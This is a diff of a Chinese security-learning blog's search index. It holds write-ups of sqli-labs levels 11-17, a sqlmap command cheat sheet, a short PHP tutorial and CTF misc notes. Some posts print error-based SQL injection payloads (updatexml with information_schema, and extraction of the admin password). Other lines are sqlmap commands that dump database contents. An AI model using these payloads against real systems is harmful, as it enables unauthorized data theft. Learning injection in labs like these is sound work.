-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130210427554.png"></p>
-<p><img src="/2020/11/30/sqli-labs-less5-6/image-20201130210340395.png"></p>
-<p>大概是这样一个过程，在有回显的情况下，报错注入的优势更为突出了。</p>
+    <title>sqllib 11-16</title>
+    <url>/2021/01/15/sqllib-11-16/</url>
+    <content><![CDATA[<h2 id="less11、less12"><a href="#less11、less12" class="headerlink" title="less11、less12"></a>less11、less12</h2><p><img src="/2021/01/15/sqllib-11-16/image-20210115195957251.png"></p>
+<p>这两关与less1-4基本思路相同，这边主要是想尝试一下一次性爆出所有数据</p>
+<h2 id="less13、less14"><a href="#less13、less14" class="headerlink" title="less13、less14"></a>less13、less14</h2><p><img src="/2021/01/15/sqllib-11-16/image-20210122231855864.png"><span class="image-caption">image-20210122231855864</span></p>
+<p>？？？？？？？？？？公屏打在问号上</p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210122233855565.png"><span class="image-caption">image-20210122233855565</span></p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210122234206216.png"><span class="image-caption">image-20210122234206216</span></p>
+<p>仔细观察可以看出，我在这里把submit改成了1submit，在源代码中修改</p>
+<p>具体原因如下</p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210122234345703.png"><span class="image-caption">image-20210122234345703</span></p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210123113701694.png"><span class="image-caption">image-20210123113701694</span></p>
+<p>然后就是猜下去的问题了</p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210123114437891.png"><span class="image-caption">image-20210123114437891</span></p>
+<p>这里应该是可以用报错注入的，那我直接尝试一下爆数据</p>
+<p>先试一下</p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210123121815689.png"><span class="image-caption">image-20210123121815689</span></p>
+<p>这边一定要打#，–+在这里不适用</p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210123122225873.png"><span class="image-caption">image-20210123122225873</span></p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210123122432714.png"><span class="image-caption">image-20210123122432714</span></p>
+<p>大概就是这样子的啦，less14在less13的基础上将‘）换成了“，其余皆相同，这里不再赘述</p>
+<h2 id="less15、less16"><a href="#less15、less16" class="headerlink" title="less15、less16"></a>less15、less16</h2><p>这两关均无报错信息，只能用延时和报错了</p>
+<p>less15 为’，less16为“）</p>
+<p><img src="/2021/01/15/sqllib-11-16/image-20210123204010453.png"><span class="image-caption">image-20210123204010453</span></p>
+<p>正确的时候可以直接登录，不正确的时候延时 5 秒</p>
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1418,37 +1520,6 @@
 
 <h3 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs mysql">Select *** from ****<br></code></pre></td></tr></table></figure>
 
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqllib 11-16</title>
-    <url>/2021/01/15/sqllib-11-16/</url>
-    <content><![CDATA[<h2 id="less11、less12"><a href="#less11、less12" class="headerlink" title="less11、less12"></a>less11、less12</h2><p><img src="/2021/01/15/sqllib-11-16/image-20210115195957251.png"></p>
-<p>这两关与less1-4基本思路相同，这边主要是想尝试一下一次性爆出所有数据</p>
-<h2 id="less13、less14"><a href="#less13、less14" class="headerlink" title="less13、less14"></a>less13、less14</h2><p><img src="/2021/01/15/sqllib-11-16/image-20210122231855864.png"><span class="image-caption">image-20210122231855864</span></p>
-<p>？？？？？？？？？？公屏打在问号上</p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210122233855565.png"><span class="image-caption">image-20210122233855565</span></p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210122234206216.png"><span class="image-caption">image-20210122234206216</span></p>
-<p>仔细观察可以看出，我在这里把submit改成了1submit，在源代码中修改</p>
-<p>具体原因如下</p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210122234345703.png"><span class="image-caption">image-20210122234345703</span></p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210123113701694.png"><span class="image-caption">image-20210123113701694</span></p>
-<p>然后就是猜下去的问题了</p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210123114437891.png"><span class="image-caption">image-20210123114437891</span></p>
-<p>这里应该是可以用报错注入的，那我直接尝试一下爆数据</p>
-<p>先试一下</p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210123121815689.png"><span class="image-caption">image-20210123121815689</span></p>
-<p>这边一定要打#，–+在这里不适用</p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210123122225873.png"><span class="image-caption">image-20210123122225873</span></p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210123122432714.png"><span class="image-caption">image-20210123122432714</span></p>
-<p>大概就是这样子的啦，less14在less13的基础上将‘）换成了“，其余皆相同，这里不再赘述</p>
-<h2 id="less15、less16"><a href="#less15、less16" class="headerlink" title="less15、less16"></a>less15、less16</h2><p>这两关均无报错信息，只能用延时和报错了</p>
-<p>less15 为’，less16为“）</p>
-<p><img src="/2021/01/15/sqllib-11-16/image-20210123204010453.png"><span class="image-caption">image-20210123204010453</span></p>
-<p>正确的时候可以直接登录，不正确的时候延时 5 秒</p>
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1931,6 +2002,21 @@
       </tags>
   </entry>
   <entry>
+    <title>sqlmap的使用常见语句</title>
+    <url>/2021/01/28/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5/</url>
+    <content><![CDATA[<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –dbs  // 列举数据库 </p>
+<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –current-db  // 当前数据库</p>
+<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –users   // 列数据库用户</p>
+<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</p>
+<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”  // 列举数据库的表名</p>
+<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”  // 获取表的列名</p>
+<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”  // 获取表中的数据，包含列 </p>
+]]></content>
+      <tags>
+        <tag>sql工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs</title>
     <url>/2021/01/31/upload-labs/</url>
     <content><![CDATA[<h1 id="pass-01前端js绕过"><a href="#pass-01前端js绕过" class="headerlink" title="pass-01前端js绕过"></a>pass-01前端js绕过</h1><p><img src="/2021/01/31/upload-labs/image-20210131134748188.png"></p>
@@ -2081,56 +2167,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqlmap的使用常见语句</title>
-    <url>/2021/01/28/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5/</url>
-    <content><![CDATA[<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –dbs  // 列举数据库 </p>
-<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –current-db  // 当前数据库</p>
-<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –users   // 列数据库用户</p>
-<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</p>
-<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”  // 列举数据库的表名</p>
-<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”  // 获取表的列名</p>
-<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”  // 获取表中的数据，包含列 </p>
-]]></content>
-      <tags>
-        <tag>sql工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqllib 17</title>
-    <url>/2021/01/23/%E2%80%98sqllib-17/</url>
-    <content><![CDATA[<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144231845.png"></p>
-<p>思路大体不变，这边使用报错注入就对了，然后爆破数据库，数据表，数据列，数据，</p>
-<p>对这边是在password中开始注入，username被处理了，在之前的关卡中在username和password中都是可以进行注入的，具体来看看源代码</p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202305451.png"></p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202334193.png"></p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144709315.png"></p>
-<p>出了一点点意外，这个只能返回一行，并且updatexml函数只能截取32位的数据，那看来要对查询语句进行限制</p>
-<p>刚才的语句为</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145032248.png"></p>
-<p>现在的语句是</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145938668.png"></p>
-<p>没想到啊，这边还有操作，百度搜了一下，看来我需要套个娃</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124150339099.png"> </p>
-<p>还是不太行，对需要别名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)aa), <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124193458237.png">不是常量，绕过失败</p>
-<p>上网搜了一下dalao的解法</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and (updatexml(1,concat(0x5c,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>)aa),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
-
-<p>这边是知道了username去查询password，where username=’admin’可更换为limit 进行查询</p>
-]]></content>
-      <tags>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bugku web 1-12</title>
     <url>/2021/01/15/%E2%80%98ugku-web-1-n/</url>
     <content><![CDATA[<p>前面几题基本上看看评论就知道怎么操作了，受到了第八题的影响，第九题确实极具迷惑性。</p>
@@ -2170,6 +2206,41 @@
       </tags>
   </entry>
   <entry>
+    <title>sqllib 17</title>
+    <url>/2021/01/23/%E2%80%98sqllib-17/</url>
+    <content><![CDATA[<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144231845.png"></p>
+<p>思路大体不变，这边使用报错注入就对了，然后爆破数据库，数据表，数据列，数据，</p>
+<p>对这边是在password中开始注入，username被处理了，在之前的关卡中在username和password中都是可以进行注入的，具体来看看源代码</p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202305451.png"></p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202334193.png"></p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144709315.png"></p>
+<p>出了一点点意外，这个只能返回一行，并且updatexml函数只能截取32位的数据，那看来要对查询语句进行限制</p>
+<p>刚才的语句为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145032248.png"></p>
+<p>现在的语句是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145938668.png"></p>
+<p>没想到啊，这边还有操作，百度搜了一下，看来我需要套个娃</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124150339099.png"> </p>
+<p>还是不太行，对需要别名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)aa), <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124193458237.png">不是常量，绕过失败</p>
+<p>上网搜了一下dalao的解法</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and (updatexml(1,concat(0x5c,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>)aa),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>这边是知道了username去查询password，where username=’admin’可更换为limit 进行查询</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>“Python 文件操作</title>
     <url>/2020/10/16/%E2%80%9Cpython-%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h2 id="打开一个txt文件"><a href="#打开一个txt文件" class="headerlink" title="打开一个txt文件"></a>打开一个txt文件</h2><p>先新建一个文件夹，在其中新建一个空的Python文件</p>
@@ -2201,6 +2272,35 @@
       </tags>
   </entry>
   <entry>
+    <title>关于PHP</title>
+    <url>/2020/10/09/%E5%85%B3%E4%BA%8EPHP/</url>
+    <content><![CDATA[<p>PHP 是一门弱类型语言，对新手来说还是很友好的。</p>
+<h2 id="PHP语法"><a href="#PHP语法" class="headerlink" title="PHP语法"></a>PHP语法</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// PHP 代码</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 这是 PHP 单行注释</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这是</span><br><span class="hljs-comment">PHP 多行</span><br><span class="hljs-comment">注释</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h2><h3 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h3><p> <img src="/2020/10/09/%E5%85%B3%E4%BA%8EPHP/PHP%E5%8F%98%E9%87%8F%E8%A7%84%E5%88%99.png"></p>
+<h3 id="4种变量作用域"><a href="#4种变量作用域" class="headerlink" title="4种变量作用域"></a>4种变量作用域</h3><p>local //只能在函数之外进行访问<br>global //访问全局变量，只能在函数之外进行访问，global关键字<br>static //局部变量不被删除<br>parameter //参数，通过调用代码将值传递给函数的局部变量，在参数列表中声明，为函数声明的一部分</p>
+<h4 id="global-关键字"><a href="#global-关键字" class="headerlink" title="global 关键字"></a>global 关键字</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$x=<span class="hljs-number">5</span>;<br>$y=<span class="hljs-number">10</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">global</span> $x,$y;<br>	$y=$x+$y;<br>&#125;<br><br>myTest();<br><span class="hljs-keyword">echo</span> $y; <span class="hljs-comment">// 输出15</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>其中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">global</span> $x,$y;<br>	$y=$x+$y;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>可改写为</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> myTest()<br>&#123;<br>    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;y&#x27;</span>]=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;x&#x27;</span>]+<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;y&#x27;</span>]; <span class="hljs-regexp">//</span>PHP将所有全局变量存储在<span class="hljs-variable">$GLOBALS</span>（大写）[index]的数组可以在函数中内部访问，也可以直接用来更新全局变量。<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Static作用域"><a href="#Static作用域" class="headerlink" title="Static作用域"></a>Static作用域</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">static</span> $x=<span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">echo</span> $x;<br>	$x++;  <span class="hljs-comment">//$x++ : 是先执行 $x的值  然后在 +1；</span><br>	<span class="hljs-keyword">echo</span> PHP_EOL; <span class="hljs-comment">//换行符</span><br><br>&#125;<br><br>myTest();<br>myTest();<br>myTest();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="参数作用域"><a href="#参数作用域" class="headerlink" title="参数作用域"></a>参数作用域</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params">$x</span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">echo</span> $x;<br>&#125;<br>myTest(<span class="hljs-number">8</span>); <span class="hljs-comment">//输出8</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="局部和全局作用域"><a href="#局部和全局作用域" class="headerlink" title="局部和全局作用域"></a>局部和全局作用域</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$x=<span class="hljs-number">5</span>; <span class="hljs-comment">//全局变量</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myTest</span>(<span class="hljs-params"></span>) //<span class="hljs-title">function</span>:用于申明用户自定义函数的关键字.</span><br><span class="hljs-function"></span>&#123;<br>	$y=<span class="hljs-number">10</span>; <span class="hljs-comment">//局部变量</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;测试函数内变量:&lt;/p&gt;&quot;</span>; <span class="hljs-comment">//&lt;p&gt;称为开始标记，&lt;/p&gt;称为结束标记。把一段话写在这两个标记中间，在用浏览器浏览的时候，浏览器会把这一段话显示为一个段落。</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 x 为: <span class="hljs-subst">$x</span>&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">//&lt;br&gt; 标签是空标签，可插入一个简单的换行符。</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 y 为: <span class="hljs-subst">$y</span>&quot;</span>;<br>&#125;<br><br>myTest();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;测试函数外变量：&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 x 为: <span class="hljs-subst">$x</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量 y 为:<span class="hljs-subst">$y</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="echo-和-print-语句"><a href="#echo-和-print-语句" class="headerlink" title="echo 和 print 语句"></a>echo 和 print 语句</h3><h4 id="echo-语句"><a href="#echo-语句" class="headerlink" title="echo 语句"></a>echo 语句</h4><p>echo 或 echo() 可输出一个至多个字符串，速度比print快，无返回值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;PHP很有趣！&lt;/h2&gt;&quot;</span>; <span class="hljs-comment">//标题标签用于标题文本。不要仅仅为了产生粗体文本而使用它们。(h1~h6字体依次减小,为html标签)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello world!&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这是一个&quot;</span>,<span class="hljs-string">&quot;字符串,&quot;</span>,<span class="hljs-string">&quot;使用了&quot;</span>,<span class="hljs-string">&quot;多个&quot;</span>,<span class="hljs-string">&quot;参数。&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$txt1=<span class="hljs-string">&quot;学习PHP&quot;</span>;<br>$txt2=<span class="hljs-string">&quot;RUNOOB.COM&quot;</span>;<br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>); <span class="hljs-comment">//Array 函数允许您访问并操作数组。支持简单的数组和多维数组。</span><br><br><span class="hljs-keyword">echo</span> $txt1;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;在 <span class="hljs-subst">$txt2</span> 学习PHP&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我车的品牌是<span class="hljs-subst">&#123;$cars[0]&#125;</span>&quot;</span>; <span class="hljs-comment">//数字索引，从0开始。</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h4><p>print 或 print () 仅允许输出一个字符串，返回值总为1</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;h2&gt;PHP很有趣！&lt;/h2&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello world!&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;学习php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$txt1=<span class="hljs-string">&quot;学习PHP&quot;</span>;<br>$txt2=<span class="hljs-string">&quot;RUNOOB.COM&quot;</span>;<br>$cars=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br><br><span class="hljs-keyword">print</span> $txt1;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;在 <span class="hljs-subst">$txt2</span> 学习PHP&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;我车的品牌是<span class="hljs-subst">&#123;$cars[0]&#125;</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界-misc1</title>
     <url>/2021/03/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc1/</url>
     <content><![CDATA[<h1 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h1><p>从前有个人没有钱冲vip，然后他拿到的pdf的图片文件无法编辑，他以为要把图片提取出来，后面发现只要pdf转word，就可以把图片移开，就能看见flag</p>
@@ -2228,6 +2328,42 @@
 <p><img src="/2021/03/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc1/image-20210329220144077.png"><span class="image-caption">image-20210329220144077</span></p>
 <p>拿到png文件发现是白的，010打开发现是gif文件</p>
 <p>剩下的p图，然后扫码就完事了</p>
+]]></content>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界misc-2</title>
+    <url>/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/</url>
+    <content><![CDATA[<h1 id="Aesop-secret"><a href="#Aesop-secret" class="headerlink" title="Aesop_secret"></a>Aesop_secret</h1><p>附件是一个疯狂跳动的gif，感觉有一点点像二维码，用ps修改后发现是</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210401204948831.png"></p>
+<p>ISCC? 比赛的名称，这</p>
+<p>用010查看gif，</p>
+<p><img src="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc-2/image-20210401205032655.png"></p>
